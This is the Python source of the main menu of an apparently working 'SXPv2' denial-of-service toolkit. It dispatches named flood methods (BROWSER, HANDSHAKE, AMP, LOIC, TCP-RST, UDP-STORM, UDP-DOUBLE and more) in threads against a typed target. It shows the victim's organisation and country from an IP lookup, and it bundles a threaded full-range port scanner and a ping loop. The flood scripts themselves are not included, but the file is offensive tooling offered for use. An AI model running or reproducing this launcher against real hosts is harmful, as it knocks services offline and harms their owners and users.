from attrs import menu_lang,custom_lang, clear_console,color_gardient,red_gr
from banner import methods,query
import time,os,threading,json,socket, concurrent.futures,sys,requests,re

def stop():
    data = ''
    c = 1
    with open(os.getcwd()+"/methods/STOP.txt","r") as f:
        data = f.read().upper().replace("\n","")
    with open(os.getcwd()+"/methods/STOP.txt","w") as f:
        if data in ['YES','TRUE']:f.write("NO"); c = 0
        else:f.write("YES")
    if c == 0:
       return '\x1b[38;5;76mC\x1b[38;5;77mU\x1b[38;5;78mR\x1b[38;5;79mR\x1b[38;5;80mE\x1b[38;5;81mN\x1b[38;5;80mT \x1b[38;5;75mSTOP\x1b[0m'
    else:
       return '\x1b[38;5;196mC\x1b[38;5;197mU\x1b[38;5;198mR\x1b[38;5;199mR\x1b[38;5;200mE\x1b[38;5;201mN\x1b[38;5;200mT \x1b[38;5;207mRUN\x1b[0m'

def q(languages,meth):
   a = query(languages['LANG'],meth)
   if a[0] == True:
      return a[1]
   else:return a[0]

def check_port(ip, port, protocol):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == 'UDP' else socket.SOCK_STREAM)
        s.settimeout(3)
        s.sendto(b'', (ip, port)) if protocol == 'UDP' else s.connect((ip, port))
        return port
    except Exception:
        return None

port_live,port_on,port_keep = 0, 0,[]

def checked_protocol(ip, protocol, many):
    with concurrent.futures.ThreadPoolExecutor(max_workers=many) as executor:
        futures = {executor.submit(check_port, ip, port, protocol): port for port in range(1, 65536)}
        return [future.result() for future in concurrent.futures.as_completed(futures) if future.result()]

def type_sender(meth, args):
    null_output = '> NUL 2>&1' if os.name == 'nt' else '> /dev/null 2>&1'
    os.system(f'python methods/{meth}.py {args} {null_output}')

def replace_prompt_format(args):
    args = args.replace('::FG','::FC').replace("::BG","::BC")
    color_map = {}
    for prefix in ['FC', 'BC']:
        for code in range(256):
            color_code = f'{prefix}_{code}'
            escape_sequence = f'\x1b[38;5;{code}m' if prefix == 'FC' else f'\x1b[48;5;{code}m'
            color_map[color_code] = escape_sequence

    for placeholder, escape_sequence in color_map.items():
        args = args.replace(f'::{placeholder}::', escape_sequence)

    t = time.ctime().split()
    args = args.replace("::YEAR::", t[4]).replace("::TIME::", t[3]).replace("::HOUR::", t[3].split(":")[0]).replace("::MIN::", t[3].split(":")[1]).replace("::SEC::", t[3].split(":")[2]).replace("::WEEK::", t[0]).replace("::MONTH::", t[1]).replace("::DAY::", t[2]).replace("::DATE::", time.ctime())
    args = args.replace("::RESET::", '\x1b[0m').replace("::BOLD::", "\x1b[1m").replace("::DIM::", "\x1b[2m").replace("::FAINT::", "\x1b[22m").replace("::UNDERLINE::", '\x1b[4m').replace("::STRIKETHROUGH::", '\x1b[9m').replace("::ITALIC::", "\x1b[3m")

    return args
menu = """               \x1b[38;5;196m╔═╗\x1b[38;5;197m═╗ ╦\x1b[38;5;198m╔═╗\x1b[38;5;40m╔╦╗\x1b[38;5;41m╔═╗\x1b[38;5;42m╔═╗\x1b[38;5;43m╦  \n               \x1b[38;5;196m╚═╗\x1b[38;5;197m╔╩╦╝\x1b[38;5;198m╠═╝ \x1b[38;5;76m║ \x1b[38;5;77m║ ║\x1b[38;5;78m║ ║\x1b[38;5;79m║  \n               \x1b[38;5;196m╚═╝\x1b[38;5;197m╩ ╚═\x1b[38;5;198m╩o  \x1b[38;5;112m╩\x1b[38;5;113m ╚═╝\x1b[38;5;114m╚═╝\x1b[38;5;115m╩═╝\n              \x1b[38;5;196m══╦══════════════════╦══\n    \x1b[38;5;197m╔═══════════╩══════════════════╩═══════════╗╗\n  \x1b[38;5;198m┏┓║         \x1b[38;5;76mWelcome \x1b[38;5;77mTo \x1b[38;5;208mS\x1b[38;5;209mX\x1b[38;5;210mP\x1b[38;5;211mv\x1b[38;5;212m2\x1b[38;5;255m.\x1b[38;5;226mDOS \x1b[38;5;78mTOOL        \x1b[38;5;198m║┏┳┓\n  \x1b[38;5;199m┃┃╚══════════════════════════════════════════╝┃┃┃\n  \x1b[38;5;200m┃┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┃┃\n\x1b[38;5;201m┏━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┻┳┓\n\x1b[38;5;200m┃\x1b[38;5;226m%s\x1b[38;5;200m┃┃\n\x1b[38;5;199m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┛\n     \x1b[38;5;21mCopyright \x1b[38;5;57m© \x1b[38;5;93m%s \x1b[38;5;129mSXPv2 \x1b[38;5;165mAll \x1b[38;5;165mRight's \x1b[38;5;201mReserved\x1b[0m"""
atk = '''\x1b[38;5;196m┏━━━━━━━━━━━━━━━━━━━━┳┓\n\x1b[38;5;196m┃ \x1b[38;5;76m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┃ \x1b[38;5;77m╠═╣ ║  ║ ╠═╣║  ╠╩╗ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┃ \x1b[38;5;78m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┗━━┳━━━━━━━━━━━━━━━━━┻┛\n\x1b[38;5;196m   ┣━\x1b[38;5;76mS\x1b[38;5;77mT\x1b[38;5;78mA\x1b[38;5;79mT\x1b[38;5;80mU\x1b[38;5;81mS\n\x1b[38;5;197m   ┃  \x1b[38;5;202m└─\x1b[38;5;255m[\x1b[38;5;208m%s\x1b[38;5;255m]\n\x1b[38;5;198m   ┣━━\x1b[38;5;76mA\x1b[38;5;77mT\x1b[38;5;77mT\x1b[38;5;78mA\x1b[38;5;79mC\x1b[38;5;80mK\n\x1b[38;5;199m   ┃   \x1b[38;5;203m├─\x1b[38;5;208mT\x1b[38;5;209mA\x1b[38;5;210mR\x1b[38;5;211mG\x1b[38;5;212mE\x1b[38;5;213mT \x1b[38;5;210m%s\n\x1b[38;5;200m   ┃   \x1b[38;5;209m└─\x1b[38;5;208mM\x1b[38;5;209mE\x1b[38;5;210mT\x1b[38;5;211mH\x1b[38;5;212mO\x1b[38;5;213mD \x1b[38;5;210m%s\n\x1b[38;5;201m   ┣━━\x1b[38;5;76mT\x1b[38;5;77mA\x1b[38;5;78mR\x1b[38;5;79mG\x1b[38;5;80mE\x1b[38;5;81mT\n       \x1b[38;5;207m├─\x1b[38;5;208mO\x1b[38;5;209mR\x1b[38;5;210mG \x1b[38;5;210m%s\n       \x1b[38;5;213m└─\x1b[38;5;208mC\x1b[38;5;209mO\x1b[38;5;210mU\x1b[38;5;211mN\x1b[38;5;212mT\x1b[38;5;213mR\x1b[38;5;219mY \x1b[38;5;210m%s'''

def format_banner(data):return data.replace('\\x1b','\x1b').replace('\\n','\n')
c = 0

def handle_attack_command(com, languages, attack_type,mode,more=''):
    target,BACKUP = '',''
    b = q(languages, attack_type)
    if b != False:
        print(b % (com[0]))
    else:
        c = 0
        if more != '':BACKUP = attack_type; attack_type = more.replace('-','_')
        else:attack_type = attack_type.replace('-','_')
        if mode == 1:
           if len(com) == 6:target,thread,times,meths,p = com[1], com[2], com[3],com[4], com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths} {p} command.txt')).start(); c = 1
        elif mode == 2:
           if len(com) == 5:target,thread,times,meths = com[1], com[2], com[3],com[4]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths}')).start(); c = 1
        elif mode == 5:
           if len(com) == 6:target,port,thread,times,meths = com[1],com[2], com[3], com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {meths}')).start(); c = 1
        elif mode == 3:
           if len(com) == 4:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); c = 1
        if mode == 4:
           if len(com) == 6:target,port,times,booter,p = com[1], com[2], com[3],com[4], com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {times} {booter} {p}')).start(); c = 1
        if c == 0:
           if more != '':a = format_banner(languages['METHODS'][BACKUP.replace('-','').replace('_','')])
           else:a = format_banner(languages['METHODS'][attack_type.replace('-','').replace('_','')])
           if more == 'UDP-DOUBLE':a = a.replace('size','booter').replace('thread','times')
           if more == 'LOIC':a = a.replace('methods-http','times').replace('วิธีการของคำขอ','เวลา').replace('GET','250').replace('ง่ายๆคือวิธีต่างๆ ที่ใช้ขอข้อมูลจากเว็บ','เวลา').replace('Pilih jenis metode permintaan','Waktu').replace('it type of requests methods','time').replace('Chọn loại phương thức yêu cầu','Thời gian').replace('اختر نوع طرق الطلبات','الوقت')
           if more == 'MURD-PROXY':a = a.replace('thread','times')
           if more == 'HANDSHAKE2':a=a.replace('จับมือ','จับมือ2').replace('المصافحة','المصافحة2').replace('BẮT TAY','BẮT TAY2').replace('BẮTTAY','BẮTTAY2')
           if more == 'CONNECT':a = a.replace('methods-http','opt').replace('วิธีการของคำขอ','เพิ่มเติม').replace('المصافحة','اتصال').replace('طرق-الطلب','اختيار').replace('ادخل نوع طرق الطلب','صفر للافتراضي، واحد لصفحة UAM').replace('masukkan jenis metode permintaan','it 0 untuk default, 1 untuk halaman UAM').replace('BẮTTAY','kết nối').replace('BẮT TAY','kết nối').replace('chọn loại phương thức yêu cầu','0 cho mặc định, 1 cho trang UAM').replace('phương thức-http','opt').replace('ง่ายๆคือวิธีต่างๆ ที่ใช้ขอข้อมูลจากเว็บ','0 สำหรับค่าเริ่มต้น ส่วน 1 สำหรับหน้า uam').replace('it type of requests methods','it 0 for default 1 for uam page').replace("GET",'0')
           if more == 'COOKIE':a = a.replace('المتصفح','كوكيز').replace('نوع الوكيل','اختيار').replace('فقط SOCKS4، SOCKS5، HTTP، HTTPS, NONE','صفر للافتراضي، واحد لصفحة UAM').replace('tipe-proxy','opt').replace('HANYA SOCKS4, SOCKS5, HTTP, HTTPS, NONE','it 0 untuk default, 1 untuk halaman UAM').replace('ประเภทของproxy','เพิ่มเติม').replace('เบราว์เซอร์','คุกกี้').replace('แค่ SOCKS4, SOCKS5, HTTP, HTTPS, NONE','0 สำหรับค่าเริ่มต้น ส่วน 1 สำหรับหน้า uam').replace('proxy-type','opt').replace('ONLY SOCKS4, SOCKS5, GET, HTTP, HTTPS, NONE','it 0 for default 1 for uam page').replace('BROWSER','COOKIE').replace('TRÌNHDUYỆT','bánhquy').replace('CHỈ SOCKS4, SOCKS5, HTTP, HTTPS, NONE','0 cho mặc định, 1 cho trang UAM').replace('loại proxy','opt').replace('SOCKS5','O')
           if more != '':a = a.replace(attack_type,F'{more}').replace(BACKUP,more)
           print(a)
        else:
           country,org = '',''
           try:
              r = json.loads(requests.get(f'https://ipapi.co/{com[1]}/json/').content)
              try:
               country,org = r['country_name'],r['org']
              except Exception as e:country = 'NULL'; org = 'NULL'
           except:country = 'ERROR'; org = 'ERROR'
           print(atk % (languages['DISPLAY']['ATTACK'], target, com[0],org,country))

def controler():
    global port_live,port_on,port_keep,c,methods,q
    languages = menu_lang()
    print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
    cache = ''
    prompt = "\x1b[38;5;76mS\x1b[38;5;77mX\x1b[38;5;78mP\x1b[38;5;255m.\x1b[38;5;226mT\x1b[38;5;227mO\x1b[38;5;228mO\x1b[38;5;229mL \x1b[38;5;196m--> \x1b[0m"
    while True:
     try:
        if len(cache) != 0:
           commander = input(replace_prompt_format(cache))
        else:
         commander = input(prompt)
        com = commander.split(' '); a = com[0].replace('!','').upper()
        if a == 'HELP':print(format_banner(languages['DISPLAY']['HELP']))
        elif a == 'LANGUAGES':
           c = 0
           if len(com) == 2:
              lang = com[1].upper()
              if lang in ['TH','EN', 'AR','VN','IN']:
                 if languages['LANG'] == lang:print('\x1b[38;5;196m Same Languages\x1b[0m')
                 else:languages = custom_lang(lang); c = 1
              else:print(f'\x1b[38;5;196m Wrong Languages ( TH, VN, AR, EN, IN ) !\x1b[0m')
           else:languages = menu_lang(); c = 1
           if c == 1:print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'CLS':clear_console()
        elif a in ['METH','ATTACKS','ATK','HUB','METHOD','METHODS']:print(methods())
        elif a in ['BROWSER','المتصفح','เบราว์เซอร์'] or a.encode() == b'TR\xc3\x8cNHDUY\xe1\xbb\x86T':handle_attack_command(com, languages, 'BROWSER',1)
        elif a in ['HANDSHAKE','المصافحة','จับมือ'] or a.encode() == b'B\xe1\xba\xaeTTAY':handle_attack_command(com, languages, 'HANDSHAKE',2)
        elif a in ['HANDSHAKE2','المصافحة2','จับมือ2'] or a.encode() == b'B\xe1\xba\xaeTTAY2':handle_attack_command(com, languages, 'HANDSHAKE',2,'HANDSHAKE2')
        elif a == 'RAPID-FAST':handle_attack_command(com, languages, 'MURD',3,'RAPID-FAST')
        elif a in ['AMP','أمب','ขยาย']:handle_attack_command(com, languages, 'AMP',2)
        elif a == 'MURD':handle_attack_command(com, languages, 'MURD',3)
        elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURD',3,'MURD-OPT')
        elif a in ['MURD-PROXY','MURD_PROXY','MURDPROXY']:handle_attack_command(com, languages, 'MURD',3,'MURD-PROXY')
        elif a == 'HYBRID':handle_attack_command(com, languages, 'MURD',3,'HYBRID')
        elif a == 'LOIC':handle_attack_command(com, languages, 'MURD',3,'LOIC')
        elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
        elif a in ['اتصال','เชื่อมต่อ','CONNECT'] or a.encode() == 'K\xe1\xba\xbeT':handle_attack_command(com, languages, 'HANDSHAKE',2,'CONNECT')
        elif a in ['COOKIE','คุกกี้','kue kering','كوكيز','bánh quy','bánhquy','kuekering']:handle_attack_command(com, languages, 'BROWSER',1,'COOKIE')
        elif a in ['TCP-RST','TCPRST','TCP_RST']:handle_attack_command(com, languages, 'TCP-RESET',2)
        elif a in ['UDP-STORM','UDPSTORM','UDP_STORM']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-STORM')
        elif a in ['UDP-DOUBLE','UDPDOUBLE','UDP_DOUBLE']:
           if len(com) != 1 and len(com) != 6:com.append('methods/MODEL/kB-SIZE.txt')
           handle_attack_command(com, languages, 'TCP-RESET',4,'UDP-DOUBLE')
        elif a in ['STOP','หยุด','Dừng lại','BERHENTI','توقف']:
           print(stop())
        elif a in ['UDP-SLOW','UDPSLOW','UDP_SLOW']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-SLOW')
        elif a == 'REVIEW':
           if len(com) == 3:
              c = com[1]
              b = com[2]
              try:
                 if c == '0':c = 'GOOD'
                 elif c == '1':c = 'FAIL'
                 r = requests.get('https://b95e6e1b-d19e-43e6-a070-92d5a04bceaf-00-6igc6jzjmncr.spock.replit.dev/RANKS={c}&{b}')
                 if r.status_code == 502:print('\x1b[38;5;70m SORRY DEV WAS NOT OPEN REVIEW SERVER!\x1b[0m')
                 else:
                  print('\x1b[38;5;70m SENT REVIEW TO DEV DONE!\x1b[0m')
              except:print('\x1b[38;5;196m FAILED CONNECT TO SERVER REVIEW\x1b[0m')
           else:print('\x1b[38;5;196m!review \x1b[38;5;197m<\x1b[38;5;198mMETHODS\x1b[38;5;197m> \x1b[38;5;197m<\x1b[38;5;198m0 or 1\x1b[38;5;197m>\n\x1b[38;5;70m 0 it GOOD\n\x1b[38;5;70m 1 it FAIL')
        elif a == 'PAPING':
           if len(com) == 5:
              ip = com[1]
              port = int(com[2])
              protocol = com[3]
              timeouts = int(com[4])
              while True:
                 try:
                    if protocol == 'TCP':
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeouts); s.connect((ip, port)); s.connect_ex((ip, port)); start_time = time.time(); s.send(b''); s.sendall(b''); end_time = time.time(); response_time_ms = (end_time - start_time) * 1000
                    else:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeouts); start_time = time.time(); s.sendto(b'',((ip,port))); end_time = time.time(); response_time_ms = (end_time - start_time) * 1000
                    print(format_banner(languages['PING']['OK']%(ip,response_time_ms,protocol,port)))
                 except KeyboardInterrupt:break
                 except:c = 1; print(format_banner(languages['PING']['NO']%(ip,port)))
           else:
              print('\x1b[38;5;112mPAPING \x1b[38;5;76m<\x1b[38;5;78mIP OR HOSTNAME\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;106mPORT\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;196mTCP OR UDP only\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;78mtimeout\x1b[38;5;76m>\x1b[0m')
        elif a == 'CUSTOM_PROMPT':
          prompt_set = input('\x1b[38;5;196mP\x1b[38;5;197mR\x1b[38;5;198mO\x1b[38;5;199mM\x1b[38;5;200mP\x1b[38;5;201mT\x1b[38;5;255m? \x1b[38;5;76m')
          cache = prompt_set
          prompt = replace_prompt_format(prompt_set)
        elif a == 'SCAN':
           if len(com) == 4:
              ip = com[1]; protocol = com[2]; many = int(com[3])
              port_live = 0; port_on = 0; port_keep.clear()
              t = threading.Thread(target=checked_protocol,args=(ip, protocol, many)); t.start()
              while True:
                 if port_live > 65535 or port_live == 65535:break
                 else:
                    sys.stdout.write(f"\r\x1b[0;m{format_banner(languages['PING']['OPEN']%(port_keep))} \x1b[38;5;51mNOW\x1b[38;5;225m=\x1b[38;5;196m{port_live}\x1b[38;5;225m/\x1b[38;5;76m{port_on}\x1b[0m\033[K"); sys.stdout.flush()
              print('\rDONE\033[K\n')
              t.join()
           else:print('\x1b[38;5;55mSCAN \x1b[38;5;55m<\x1b[38;5;76mip or hostname\x1b[38;5;55m> \x1b[38;5;55m<\x1b[38;5;76mUDP OR TCP only\x1b[38;5;55m> \x1b[38;5;55m<\x1b[38;5;76mthread\x1b[38;5;55m>\n\n  \x1b[38;5;55m<\x1b[38;5;76mthread\x1b[38;5;55m> \x1b[38;5;255mmax it idk but less it better for scan but it slow too.\n\n\x1b[38;5;226mExample\n \x1b[38;5;196mSCAN \x1b[38;5;76m1.1.1.1 \x1b[38;5;77mTCP \x1b[38;5;78m2000\x1b[0m')
        elif a == 'MENU':clear_console(); print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'EXIT':exit()
        else:print(color_gardient(f'Not Found COMMAND --> {a}',red_gr,opt=0))
     except KeyboardInterrupt:
        if c == 0:exit()
        else:c = 0
